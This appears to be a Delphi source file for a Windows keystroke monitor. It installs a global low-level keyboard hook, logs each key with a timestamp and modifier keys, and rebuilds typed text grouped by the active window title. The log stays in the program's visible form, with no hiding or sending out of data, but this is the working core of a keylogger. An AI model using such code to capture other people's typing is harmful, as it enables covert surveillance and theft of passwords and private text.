unit Unit1;

{*******************************************************************************
  Low Level Keyboard Hook Implementation

  Purpose:
    Provides a detailed keyboard monitoring system with two output modes:
    1. Technical logging with timestamps and key combinations
    2. Real-time typing simulation with window context awareness

  Author: BitmasterXor
  Modified: December 2024
*******************************************************************************}

interface

{*******************************************************************************
  Uses Clause Breakdown:
  - Winapi.Windows: Core Windows API functions and types
  - Winapi.Messages: Windows message handling constants
  - System.SysUtils: Core system utility functions
  - Vcl.Forms: VCL form management
  - Vcl.StdCtrls: Standard VCL controls (TMemo, TButton)
  - Vcl.Controls: Base VCL control types
  - System.Classes: Core RTL class definitions
*******************************************************************************}
uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, Vcl.Forms, Vcl.StdCtrls,
  Vcl.Controls, System.Classes;

type
  {*******************************************************************************
    KBDLLHOOKSTRUCT
    Windows low-level keyboard hook structure that receives keyboard input data
  *******************************************************************************}
  PKBDLLHOOKSTRUCT = ^KBDLLHOOKSTRUCT;
  KBDLLHOOKSTRUCT = record
    vkCode: DWORD;        // Virtual key code of the key
    scanCode: DWORD;      // Hardware scan code
    flags: DWORD;         // Key event flags (extended key, context code, etc.)
    time: DWORD;          // Timestamp of the event
    dwExtraInfo: ULONG_PTR; // Additional platform-specific information
  end;

  {*******************************************************************************
    TForm1
    Main form class implementing the keyboard hook functionality
  *******************************************************************************}
  TForm1 = class(TForm)
    Memo1, Memo2: TMemo;      // Dual memo system for different logging views
    Button1, Button2: TButton; // Hook control buttons
    Label1, Label2: TLabel;    // UI labels
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
  private
    FHookHandle: HHOOK;       // Handle to the Windows keyboard hook
    FCurrentWindow: string;    // Tracks current active window title
    procedure StartHook;
    procedure StopHook;
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

{*******************************************************************************
  Character Mapping and Key Processing Functions
*******************************************************************************}

{
  GetChar
  Maps virtual key codes to their actual character representation

  @param vkCode - Virtual key code from Windows
  @param shift - Current state of the shift key
  @return The character that would be typed with current keyboard state
}
function GetChar(vkCode: DWORD; shift: Boolean): string;
const
  // Maps number row keys to their shifted symbols
  ShiftChars: array[Ord('0')..Ord('9')] of Char = (')', '!', '@', '#', '$', '%', '^', '&', '*', '(');
begin
  case vkCode of
    // Handle letters (A-Z) with proper case
    Ord('A')..Ord('Z'):
      if not shift then
        Result := Chr(vkCode + 32)  // Convert to lowercase
      else
        Result := Chr(vkCode);      // Keep uppercase

    // Handle numbers and their shifted symbols
    Ord('0')..Ord('9'):
      if shift then
        Result := ShiftChars[vkCode]
      else
        Result := Chr(vkCode);

    // Handle special keys and their shift variants
    VK_SPACE: Result := ' ';
    VK_TAB: Result := #9;
    VK_OEM_1: if shift then Result := ':' else Result := ';';
    VK_OEM_PLUS: if shift then Result := '+' else Result := '=';
    VK_OEM_COMMA: if shift then Result := '<' else Result := ',';
    VK_OEM_MINUS: if shift then Result := '_' else Result := '-';
    VK_OEM_PERIOD: if shift then Result := '>' else Result := '.';
    VK_OEM_2: if shift then Result := '?' else Result := '/';
    VK_OEM_3: if shift then Result := '~' else Result := '`';
    VK_OEM_4: if shift then Result := '{' else Result := '[';
    VK_OEM_5: if shift then Result := '|' else Result := '\';
    VK_OEM_6: if shift then Result := '}' else Result := ']';
    VK_OEM_7: if shift then Result := '"' else Result := '''';

    // Handle numpad numbers
    VK_NUMPAD0..VK_NUMPAD9: Result := Chr(Ord('0') + (vkCode - VK_NUMPAD0));
    else Result := '';  // Return empty string for unhandled keys
  end;
end;

{*******************************************************************************
  Key Name and Event Processing
*******************************************************************************}

{
  GetKeyName
  Converts virtual key codes into human-readable key names

  @param vk - Virtual key code to convert
  @return String representation of the key name in brackets
}
function GetKeyName(vk: DWORD): string;
begin
  case vk of
    VK_ESCAPE: Result := '[ESC]';
    VK_F1..VK_F24: Result := '[F' + IntToStr(vk - VK_F1 + 1) + ']';
    VK_RETURN: Result := '[ENTER]';
    VK_BACK: Result := '[BACKSPACE]';
    VK_SPACE: Result := '[SPACE]';
    VK_TAB: Result := '[TAB]';
    VK_CAPITAL: Result := '[CAPS]';
    VK_LEFT: Result := '[LEFT]';
    VK_RIGHT: Result := '[RIGHT]';
    VK_UP: Result := '[UP]';
    VK_DOWN: Result := '[DOWN]';
    VK_DELETE: Result := '[DEL]';
    VK_INSERT: Result := '[INS]';
    else
      // Handle regular characters and unknown keys
      if (vk >= Ord('0')) and (vk <= Ord('Z')) then
        Result := '[' + Chr(vk) + ']'
      else
        Result := '[' + IntToStr(vk) + ']';
  end;
end;

{*******************************************************************************
  Hook Procedure Implementation
*******************************************************************************}

{
  LowLevelKeyboardProc
  Main hook callback that processes all keyboard events

  @param Code - Hook code from Windows
  @param wParam - Type of keyboard event
  @param lParam - Pointer to keyboard event details
  @return Result code to Windows hook chain
}
function LowLevelKeyboardProc(Code: Integer; wParam: WPARAM; lParam: LPARAM): LRESULT; stdcall;
var
  Hook: PKBDLLHOOKSTRUCT;
  Win: string;
  Shift: Boolean;
  Ch: string;
  Pos: Integer;
  ComboKeys: string;
  Buffer: array[0..255] of Char;
begin
  // Only process key down events
  if (Code = HC_ACTION) and (wParam = WM_KEYDOWN) then begin
    Hook := PKBDLLHOOKSTRUCT(lParam);

    // Get current window title and normalize it
    GetWindowText(GetForegroundWindow, Buffer, 256);
    Win := StringReplace(string(Buffer), '*', '', [rfReplaceAll]);
    Shift := GetKeyState(VK_SHIFT) < 0;

    with Form1 do begin
      // Handle window change detection and formatting
      if Win <> FCurrentWindow then begin
        if Memo2.Text <> '' then Memo2.Lines.Add('');
        Memo2.Lines.Add('Window: ' + Win);
        Memo2.Lines.Add(StringOfChar('=', 50));
        FCurrentWindow := Win;
      end;

      // Build modifier key combination string
      ComboKeys := '';
      if GetKeyState(VK_CONTROL) < 0 then ComboKeys := ComboKeys + '[CTRL] + ';
      if Shift then ComboKeys := ComboKeys + '[SHIFT] + ';
      if GetKeyState(VK_MENU) < 0 then ComboKeys := ComboKeys + '[ALT] + ';
      if (GetKeyState(VK_LWIN) < 0) or (GetKeyState(VK_RWIN) < 0) then
        ComboKeys := ComboKeys + '[WIN] + ';

      // Log technical details to Memo1
      Memo1.Lines.Add('[' + FormatDateTime('dd/mm/yyyy hh:nn ampm', Now) + '] ' +
        ComboKeys + GetKeyName(Hook^.vkCode));

      // Handle typing simulation in Memo2
      case Hook^.vkCode of
        VK_BACK:  // Handle backspace
          with Memo2 do if SelStart > 0 then begin
            Pos := SelStart - 1;
            Text := Copy(Text, 1, Pos) + Copy(Text, Pos + 2, MaxInt);
            SelStart := Pos;
          end;
        VK_RETURN: Memo2.Lines.Add('');  // Handle Enter key
        else begin
          // Handle regular typing
          Ch := GetChar(Hook^.vkCode, Shift);
          if Ch <> '' then with Memo2 do begin
            Pos := SelStart;
            Text := Copy(Text, 1, Pos) + Ch + Copy(Text, Pos + 1, MaxInt);
            SelStart := Pos + 1;
          end;
        end;
      end;
    end;
  end;
  Result := CallNextHookEx(Form1.FHookHandle, Code, wParam, lParam);
end;

{*******************************************************************************
  Form Event Handlers
*******************************************************************************}

// Initializes keyboard hook on button click
procedure TForm1.Button1Click(Sender: TObject);
begin
  StartHook;
end;

// Terminates keyboard hook on button click
procedure TForm1.Button2Click(Sender: TObject);
begin
  StopHook;
end;

// Initializes form and variables
procedure TForm1.FormCreate(Sender: TObject);
begin
  FHookHandle := 0;
  FCurrentWindow := '';
  Memo2.ScrollBars := ssBoth;
end;

// Ensures hook is removed when form is destroyed
procedure TForm1.FormDestroy(Sender: TObject);
begin
  StopHook;
end;

{*******************************************************************************
  Hook Management Procedures
*******************************************************************************}

{
  StartHook
  Initializes the keyboard hook and sets up initial window tracking
}
procedure TForm1.StartHook;
var
  Buffer: array[0..255] of Char;
begin
  if FHookHandle = 0 then begin
    // Install the keyboard hook
    FHookHandle := SetWindowsHookEx(WH_KEYBOARD_LL, @LowLevelKeyboardProc, HInstance, 0);

    // Log success or failure
    if FHookHandle = 0 then
      Memo1.Lines.Add('[' + FormatDateTime('hh:nn:ss', Now) + '] Hook failed: ' +
        SysErrorMessage(GetLastError))
    else begin
      Memo1.Lines.Add('[' + FormatDateTime('hh:nn:ss', Now) + '] Hook started successfully');

      // Initialize window tracking
      GetWindowText(GetForegroundWindow, Buffer, 256);
      FCurrentWindow := string(Buffer);
      Memo2.Lines.Add('Window: ' + FCurrentWindow);
      Memo2.Lines.Add(StringOfChar('=', 50));
    end;
  end;
end;

{
  StopHook
  Safely removes the keyboard hook and logs the termination
}
procedure TForm1.StopHook;
begin
  if FHookHandle <> 0 then begin
    UnhookWindowsHookEx(FHookHandle);
    FHookHandle := 0;
    Memo1.Lines.Add('Hook stopped.');
    Memo2.Lines.Add(StringOfChar('=', 50));
  end;
end;

end.
